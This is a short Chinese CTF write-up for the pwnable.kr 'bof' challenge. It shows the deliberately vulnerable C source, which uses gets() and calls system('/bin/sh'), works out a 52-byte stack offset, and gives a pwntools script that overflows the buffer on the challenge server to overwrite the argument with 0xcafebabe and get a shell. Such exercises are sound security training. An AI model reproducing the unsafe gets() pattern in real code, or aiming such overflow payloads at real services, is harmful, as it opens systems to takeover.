---
title: pwnable.kr_bof
top: false
comment: false
lang: zh-CN
date: 2021-11-15 16:16:40
tags:
categories:
  - CTF
  - PWN
  - wp
  - pwnable.kr
---

# bof

## checksec

```
[*] '/home/klose/ctf/pwn/file/pwnable_kr/bof/bof'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## source code

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}

```

## pwn

可以看到需要溢出修改func()的参数为`0xcafebabe`；

看一下偏移；

```
-0000002C overflowme      db 32 dup(?)
-0000000C var_C           dd ?
-00000008                 db ? ; undefined
-00000007                 db ? ; undefined
-00000006                 db ? ; undefined
-00000005                 db ? ; undefined
-00000004                 db ? ; undefined
-00000003                 db ? ; undefined
-00000002                 db ? ; undefined
-00000001                 db ? ; undefined
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
+00000008 arg             dd ?
```

`0x2c + 0x8 = 0x34 = 52`

exp

```python
# coding:utf-8

from pwn import *

#p = process('./bof')
p = remote('pwnable.kr', 9000)

payload = 'a' * 52 + p32(0xcafebabe)	# 0x2c + 0x8 = 44 + 8 = 52 
p.sendline(payload)

p.interactive()
```

